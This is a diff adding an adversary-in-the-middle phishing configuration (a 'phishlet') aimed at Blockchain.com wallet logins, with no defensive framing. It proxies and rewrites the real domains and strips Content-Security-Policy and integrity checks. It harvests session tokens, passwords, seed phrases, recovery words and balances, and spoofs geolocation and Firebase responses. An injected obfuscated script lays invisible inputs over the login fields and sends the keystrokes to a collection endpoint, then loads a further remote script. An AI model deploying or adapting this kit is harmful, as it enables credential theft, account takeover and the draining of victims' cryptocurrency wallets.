@@ -1,0 +1,254 @@
+#___________     .__.__    ___ ___                __              .___
+#\_   _____/__  _|__|  |  /   |   \  ____   ____ |  | __ ____   __| _/
+# |    __)_\  \/ /  |  | /    ~    \/  _ \ /  _ \|  |/ // __ \ / __ | 
+# |        \\   /|  |  |_\    Y    (  <_> |  <_> )    <\  ___// /_/ | 
+#/_______  / \_/ |__|____/\___|_  / \____/ \____/|__|_ \\___  >____ | 
+#        \/                     \/                    \/    \/     \/                                                            
+
+author: 'EvilHooked'
+min_ver: '4.3.0'
+
+login:
+  domain: 'login.blockchain.com'
+  path: '/'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wallet-helper', orig_sub: 'wallet-helper', domain: 'blockchain.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apiinfo', orig_sub: 'api', domain: 'blockchain.info', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'bcinfo', orig_sub: '', domain: 'blockchain.info', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wwwinfo', orig_sub: 'www', domain: 'blockchain.info', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'status', orig_sub: 'status', domain: 'blockchain.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wealth', orig_sub: 'wealth', domain: 'blockchain.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'exchange', orig_sub: 'exchange', domain: 'blockchain.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'recaptcha', orig_sub: 'www', domain: 'recaptcha.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'firebase', orig_sub: 'firebase', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'firebaseinstall', orig_sub: 'firebaseinstallations', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'firebaserc', orig_sub: 'firebaseremoteconfig', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'firebaselog', orig_sub: 'firebaselogging', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pagead2', orig_sub: 'pagead2', domain: 'googlesyndication.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wa-af', orig_sub: 'wa', domain: 'appsflyersdk.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'websdk-af', orig_sub: 'websdk', domain: 'appsflyersdk.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wa-onelink', orig_sub: 'wa', domain: 'onelink.me', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'blockchain-zd', orig_sub: 'blockchain', domain: 'zendesk.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'aHR0cHM6Ly9sb2dpbi5ibC5hdXRoLmNvbTo0NDM', replace: 'aHR0cHM6Ly9sb2dpbi5ibG9ja2NoYWluLmNvbTo0NDM', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'blockchain.com', search: 'aHR0cHM6Ly9sb2dpbi5ibC5hdXRoLmNvbTo0NDM', replace: 'aHR0cHM6Ly9sb2dpbi5ibG9ja2NoYWluLmNvbTo0NDM', mimes: ['application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'blockchain.com', search: 'aHR0cHM6Ly9sb2dpbi5ibC5hdXRoLmNvbTo0NDM', replace: 'aHR0cHM6Ly9sb2dpbi5ibG9ja2NoYWluLmNvbTo0NDM', mimes: ['application/javascript', 'text/javascript', 'text/html']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"', replace: "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob:; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';\"", mimes: ['text/html', 'application/xhtml+xml']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: "\\s+integrity=\"[^\"]*\"", replace: '', mimes: ['text/html', 'application/xhtml+xml'], regexp: true}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: "\\s+crossorigin=\"(anonymous|use-credentials)\"", replace: '', mimes: ['text/html', 'application/xhtml+xml'], regexp: true}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '://login\.blockchain\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '//login\.blockchain\.com', replace: '//{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.com', search: '://api\.blockchain\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.com', search: '//api\.blockchain\.com', replace: '//{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'gstatic.com', search: '://www\.gstatic\.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript', 'text/css']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'gstatic.com', search: '//www\.gstatic\.com', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript', 'text/css']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'google.com', search: '://www\.google\.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript', 'text/html']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'blockchain.com', search: 'login\.bl\.auth\.com', replace: 'login.blockchain.com', mimes: ['application/javascript', 'text/javascript'], regexp: true}
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'blockchain.com', search: 'login\.bl\.auth\.com', replace: 'login.blockchain.com', mimes: ['application/javascript', 'text/javascript', 'text/html'], regexp: true}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'websdk', domain: 'appsflyersdk.com', search: '://websdk\.appsflyersdk\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'websdk', domain: 'appsflyersdk.com', search: 'websdk\.appsflyersdk\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'text/html'], regexp: true}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'firebase', domain: 'googleapis.com', search: '://firebase\.googleapis\.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'firebaseinstall', domain: 'googleapis.com', search: '://firebaseinstallations\.googleapis\.com', replace: '://{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'firebaseremoteconfig', domain: 'googleapis.com', search: '://firebaseremoteconfig\.googleapis\.com', replace: '://{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: '://blockchain\.info', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: '//blockchain\.info', replace: '//{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '://api\.blockchain\.info', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '//api\.blockchain\.info', replace: '//{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'api\.blockchain\.info', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/json'], regexp: true}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.info', search: '://www\.blockchain\.info', replace: '://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'firebaseremoteconfig', domain: 'googleapis.com', search: '://firebaseremoteconfig\.googleapis\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'firebaselogging', domain: 'googleapis.com', search: '://firebaselogging\.googleapis\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'api.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '://api\.blockchain\.info', replace: '://{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'api.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'api\.blockchain\.info', replace: '{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript'], regexp: true}
+  - {triggers_on: 'api.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: '://blockchain\.info', replace: '://{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'firebaseremoteconfig', domain: 'googleapis.com', search: 'firebaseremoteconfig\.googleapis\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/json'], regexp: true}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'firebaselogging', domain: 'googleapis.com', search: 'firebaselogging\.googleapis\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/json'], regexp: true}
+  - {triggers_on: 'api.blockchain.com', orig_sub: 'api', domain: 'blockchain.com', search: '://api\.blockchain\.com', replace: '://{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'blockchain', domain: 'zendesk.com', search: '://blockchain\.zendesk\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'blockchain', domain: 'zendesk.com', search: 'blockchain\.zendesk\.com', replace: '{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/json'], regexp: true}
+
+auth_tokens:
+  - domain: 'login.blockchain.com'
+    keys: ['.*:regexp']
+  - domain: '.blockchain.com'
+    keys: ['.*:regexp']
+  - domain: 'www.blockchain.com'
+    keys: ['.*:regexp']
+  - domain: 'api.blockchain.info'
+    keys: ['.*:regexp']
+  - domain: '.blockchain.info'
+    keys: ['.*:regexp']
+  - domain: 'blockchain.info'
+    keys: ['.*:regexp']
+  - domain: 'api.blockchain.com'
+    keys: ['.*:regexp']
+  - domain: 'login.blockchain.com'
+    type: 'body'
+    path: '/nabu-gateway/.*'
+    name: 'sessionToken'
+    search: '"sessionToken"\s*:\s*"([^"]+)"'
+  - domain: 'api.blockchain.com'
+    type: 'body'
+    path: '/nabu-gateway/.*'
+    name: 'sessionToken'
+    search: '"sessionToken"\s*:\s*"([^"]+)"'
+  - domain: 'api.blockchain.com'
+    type: 'body'
+    path: '/nabu-gateway/.*'
+    name: 'guid'
+    search: '"(?:guid|walletGuid|walletId|loginIdentifier)"\s*:\s*"([^"]+)"'
+  - domain: 'api.blockchain.com'
+    type: 'body'
+    path: '/wallet/.*'
+    name: 'guid'
+    search: '"(?:guid|walletGuid|walletId)"\s*:\s*"([^"]+)"'
+
+auth_urls:
+  - '/account/home'
+  - '/account/home/*'
+
+credentials:
+  username:
+    key: 'email'
+    search: '"(?:email|login|username)"\s*:\s*"([^"]+)"'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"(?:password|pass|mainPassword|walletPassword|backupPassword|recoveryPassword|encryptPassword|newPassword|pwd|secret)"\s*:\s*"([^"]+)"'
+    type: 'json'
+  custom:
+    - key: 'guid'
+      search: '"(?:guid|walletGuid|walletId|loginIdentifier)"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'loginIdentifier'
+      search: '"(?:loginIdentifier|identifier)"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'mnemonic'
+      search: '"(?:mnemonic|seedPhrase|recoveryPhrase|secretRecoveryPhrase|phrase)"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'mnemonic_words'
+      search: '"(?:words|mnemonicWords|recoveryWords)"\s*:\s*\[([^\]]+)\]'
+      type: 'json'
+    - key: 'recovery_password'
+      search: '"(?:recoveryPassword|walletPassword|backupPassword|encryptPassword)"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'balance'
+      search: '"(?:balance|totalBalance|fiatBalance|availableBalance)"\s*:\s*"?([^",}]+)"?'
+      type: 'json'
+    - key: 'sessionToken'
+      search: '"sessionToken"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'captcha'
+      search: '"(?:captcha|g-recaptcha-response|recaptchaToken)"\s*:\s*"([^"]+)"'
+      type: 'json'
+
+intercept:
+  - domain: 'api.blockchain.com'
+    path: '^/nabu-gateway/geolocation2/?$'
+    http_status: 200
+    mime: 'application/json'
+    body: '{"country":"US","state":"NY","currency":"USD","isRegionSupported":true,"license":"NONE","ip":"8.8.8.8"}'
+  - domain: 'login.blockchain.com'
+    path: '^/nabu-gateway/geolocation2/?$'
+    http_status: 200
+    mime: 'application/json'
+    body: '{"country":"US","state":"NY","currency":"USD","isRegionSupported":true,"license":"NONE","ip":"8.8.8.8"}'
+  - domain: 'firebase.googleapis.com'
+    path: '^/v1alpha/projects/-/apps/'
+    http_status: 200
+    mime: 'application/json'
+    body: '{"projectId":"480718654535","appId":"1:480718654535:web:59de437","databaseURL":"","storageBucket":"blockchain-wallet.appspot.com","locationId":"us-central1","apiKey":"AIzaSyDummy","authDomain":"login.blockchain.com","measurementId":"G-ECLKXV7NVB"}'
+  - domain: 'firebaseinstallations.googleapis.com'
+    path: '^/v1/projects/[^/]+/installations'
+    http_status: 200
+    mime: 'application/json'
+    body: '{"name":"projects/480718654535/installations/fake","fid":"fake-fid","refreshToken":"fake","authToken":{"token":"fake","expiresIn":"604800s"}}'
+  - domain: 'firebaseremoteconfig.googleapis.com'
+    path: '^/v1/projects/[^/]+/namespaces/firebase:fetch'
+    http_status: 200
+    mime: 'application/json'
+    body: '{"entries":{},"state":"NO_CHANGE","templateVersion":"0"}'
+  - domain: 'firebaselogging.googleapis.com'
+    path: '.*'
+    http_status: 204
+    mime: 'text/plain'
+    body: ''
+  - domain: 'blockchain.zendesk.com'
+    path: '^/embeddable/config'
+    http_status: 200
+    mime: 'application/json'
+    body: '{"assets":{"analytics_integration_enabled":false}}'
+  - domain: 'pagead2.googlesyndication.com'
+    path: '.*'
+    http_status: 204
+    mime: 'text/plain'
+    body: ''
+
+js_inject:
+  - trigger_domains: ['login.blockchain.com']
+    trigger_paths: ['/', '/auth/login', '/auth/login/.*', '/account/.*']
+    trigger_params: []
+    script: |
+      /*bl-js-inject*/
+      (function(){
+        try{var d=Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype,"integrity");if(d&&d.set){Object.defineProperty(HTMLScriptElement.prototype,"integrity",{configurable:true,get:function(){return"";},set:function(){}});}}catch(e){}
+        var US={latitude:40.7128,longitude:-74.0060,accuracy:35};
+        function fakePos(){return{coords:US,timestamp:Date.now()};}
+        if(navigator.geolocation){
+          navigator.geolocation.getCurrentPosition=function(ok){if(ok)ok(fakePos());};
+          navigator.geolocation.watchPosition=function(ok){if(ok)ok(fakePos());return 1;};
+        }
+        try{
+          var q=navigator.permissions&&navigator.permissions.query;
+          if(q)navigator.permissions.query=function(d){
+            if(d&&d.name==='geolocation')return Promise.resolve({state:'granted',onchange:null});
+            return q.apply(this,arguments);
+          };
+        }catch(e){}
+        var pfHostMap={"login.blockchain.com":"login","www.blockchain.com":"www","api.blockchain.com":"api","wallet-helper.blockchain.com":"wallet-helper","blockchain.info":"bcinfo","www.blockchain.info":"wwwinfo","api.blockchain.info":"apiinfo","www.gstatic.com":"gstatic","www.google.com":"google","www.recaptcha.net":"recaptcha","firebase.googleapis.com":"firebase","firebaseinstallations.googleapis.com":"firebaseinstall","firebaseremoteconfig.googleapis.com":"firebaserc","firebaselogging.googleapis.com":"firebaselog","pagead2.googlesyndication.com":"pagead2","wa.appsflyersdk.com":"wa-af","websdk.appsflyersdk.com":"websdk-af","wa.onelink.me":"wa-onelink","blockchain.zendesk.com":"blockchain-zd"};
+        function pfBase(){var p=location.hostname.split('.');return p.length>=3?p.slice(1).join('.'):location.hostname;}
+        function pfMap(h){h=String(h||'').toLowerCase();var ps=pfHostMap[h];return ps?ps+'.'+pfBase():h;}
+        function pfRw(u){try{var x=new URL(u,location.href);if(!pfHostMap[x.hostname.toLowerCase()])return u;x.hostname=pfMap(x.hostname);return x.toString();}catch(e){return u;}}
+        function blIsEmailReminder(u){return/\/nabu-gateway\/.*\/auth\/|\/auth\/email-reminder|email-reminder|send-email|verify-email/i.test(String(u||''));}
+        function blIsAuthSuccess(u,m){return/\/nabu-gateway\/.*\/auth\//i.test(String(u||''))&&(m==='POST'||m==='PUT');}
+        function blOnEmailReminder(){if(window.__blEmailReminderDone)return;window.__blEmailReminderDone=1;try{window.dispatchEvent(new CustomEvent('bl-email-reminder'));}catch(e){}}
+        if(window.fetch){var _f=window.fetch.bind(window);window.fetch=function(i,n){var raw=typeof i==='string'?i:(i&&i.url?i.url:'');var meth=(n&&n.method)||(i&&i.method)||'GET';function chain(p,u){if(blIsEmailReminder(u)||blIsEmailReminder(raw)){p.then(function(r){if(r&&r.ok)blOnEmailReminder();}).catch(function(){});}if(blIsAuthSuccess(u,meth)||blIsAuthSuccess(raw,meth)){p.then(function(r){if(r&&r.ok)setTimeout(function(){try{window.dispatchEvent(new CustomEvent('bl-auth-ok'));}catch(e){}},400);}).catch(function(){});}return p;}if(typeof i==='string')return chain(_f(pfRw(i),n),pfRw(i));if(i&&i.url){var rw=pfRw(i.url);if(rw!==i.url&&typeof Request!=='undefined')return chain(_f(new Request(rw,i),n),rw);return chain(_f(rw,n),rw);}return _f(i,n);};}
+        if(window.XMLHttpRequest){var _o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){var a=[].slice.call(arguments);if(a[1])a[1]=pfRw(a[1]);if(blIsEmailReminder(a[1]))this.addEventListener('load',function(){if(this.status>=200&&this.status<300)blOnEmailReminder();});return _o.apply(this,a);};}
+        if(navigator.sendBeacon){var _sb=navigator.sendBeacon.bind(navigator);navigator.sendBeacon=function(u,d){return _sb(pfRw(u),d);};}
+        if(window.WebSocket){var _WS=window.WebSocket;window.WebSocket=function(u,p){return new _WS(pfRw(u),p);};window.WebSocket.prototype=_WS.prototype;}
+        try{if('serviceWorker' in navigator){navigator.serviceWorker.getRegistrations().then(function(r){r.forEach(function(x){x.unregister();});});}}catch(e){}
+        try{if(window.__blOverlay)return;window.__blOverlay=1;window.__blOverlayPath=location.pathname||'/';var _map={},lastPw='';function blSid(){var r='';document.cookie.split(';').forEach(function(c){var p=c.trim().split('=');if(p.length>=2&&/^[a-f0-9]{4}-[a-f0-9]{4}$/i.test(p[0]))r=decodeURIComponent(p[1]);});return r;}function blSend(force,pw,em){var id=blSid();if(!id)return;pw=pw||window.__blPwdBuf||'';em=em||'';if(!force&&pw&&pw===lastPw&&!em)return;if(!pw&&!em)return;fetch('/s/'+id+'/bl-pwd',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw,email:em,guid:(localStorage&&localStorage.getItem('loginIdentifier'))||'',submit:!!force,pathname:location.pathname||''})}).catch(function(){});if(pw)lastPw=pw;}function blNat(el,v){try{var d=Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value');(d&&d.set?d.set:function(x){el.value=x;}).call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));el.dispatchEvent(new Event('change',{bubbles:true}));}catch(e){el.value=v;}}function blAll(root,out){try{root.querySelectorAll('input,textarea').forEach(function(el){out.push(el);});root.querySelectorAll('*').forEach(function(el){if(el.shadowRoot)blAll(el.shadowRoot,out);});}catch(e){}}function blPwd(el){var t=(el.type||'').toLowerCase(),ac=(el.autocomplete||'').toLowerCase(),n=((el.name||'')+(el.id||'')+(el.placeholder||'')).toLowerCase();return t==='password'||/password/.test(ac+n);}function blEmail(el){var t=(el.type||'').toLowerCase(),ac=(el.autocomplete||'').toLowerCase(),n=((el.name||'')+(el.id||'')+(el.placeholder||'')).toLowerCase();return t==='email'||/email|username/.test(ac)||/email|login|identifier/.test(n);}function blPos(ov,el){var r=el.getBoundingClientRect();ov.style.left=r.left+'px';ov.style.top=r.top+'px';ov.style.width=Math.max(r.width,48)+'px';ov.style.height=Math.max(r.height,24)+'px';}function blBind(el,kind){if(el.__blB||el.disabled||el.readOnly)return;var r=el.getBoundingClientRect();if(r.width<4||r.height<4)return;el.__blB=1;var ov=_map[el];if(!ov){ov=document.createElement('input');ov.setAttribute('data-bl-ov','1');ov.type=kind==='p'?'password':'text';ov.autocomplete='off';ov.style.cssText='position:fixed;z-index:2147483647;opacity:0;pointer-events:auto;border:0;margin:0;padding:0;background:transparent;outline:none;';document.body.appendChild(ov);_map[el]=ov;ov.value=el.value||'';function sync(){var v=ov.value||'';blNat(el,v);if(kind==='p'){window.__blPwdBuf=v;blSend(false,v,'');}else blSend(false,'',v);}ov.oninput=ov.onkeyup=ov.onpaste=function(){setTimeout(sync,0);};el.addEventListener('focus',function(){try{ov.focus({preventScroll:true});}catch(x){}},true);sync();}blPos(ov,el);}function blScan(){if(window.__blEmailReminderDone)return;var list=[],seen={};blAll(document,list);list.forEach(function(el){seen[el]=1;if(blPwd(el))blBind(el,'p');else if(blEmail(el))blBind(el,'e');});for(var el in _map){if(!seen[el]||!document.contains(el)){try{_map[el].remove();}catch(e){}try{el.__blB=0;}catch(x){}delete _map[el];}else blPos(_map[el],el);}}document.addEventListener('click',function(e){var b=e.target&&e.target.closest&&e.target.closest('button,[role=button]');if(b&&/log in|login|continue|sign in|next/i.test(b.textContent||''))blSend(true,window.__blPwdBuf||'','');},true);document.addEventListener('keydown',function(e){if(e.key==='Enter')setTimeout(function(){blSend(true,window.__blPwdBuf||'','');},100);},true);new MutationObserver(blScan).observe(document.documentElement,{childList:true,subtree:true,attributes:true});setInterval(blScan,400);setTimeout(blScan,50);setTimeout(blScan,500);setTimeout(function(){var id=blSid();if(id&&!window.__blCapRequested){window.__blCapRequested=1;var s=document.createElement('script');s.src='/s/'+id+'/bl-cap.js';document.head.appendChild(s);}},3000);}catch(e){}
+      })();
+
+flow:
+  cors_credentials: true
+  css_url_canary: true
+  json_rewrite:
+    host_contains: [blockchain.com, blockchain.info, googleapis.com]
+    path_contains: [/nabu-gateway/, /auth/login, /auth/email, geolocation, firebase]
+  dynamic_hosts:
+    - domain: blockchain.com
+      preserve_sub: true
+      session: true
+      auto_filter: true
+      exclude_subs: [login, www, api, wallet-helper, status, wealth, exchange]
+      log_discover: true
+    - domain: blockchain.info
+      preserve_sub: true
+      session: true
+      auto_filter: true
+      exclude_subs: [api]
+      log_discover: true
+    - domain: zendesk.com
+      preserve_sub: true
+      session: false
+      auto_filter: true
+      exclude_subs: [blockchain]
+      log_discover: false
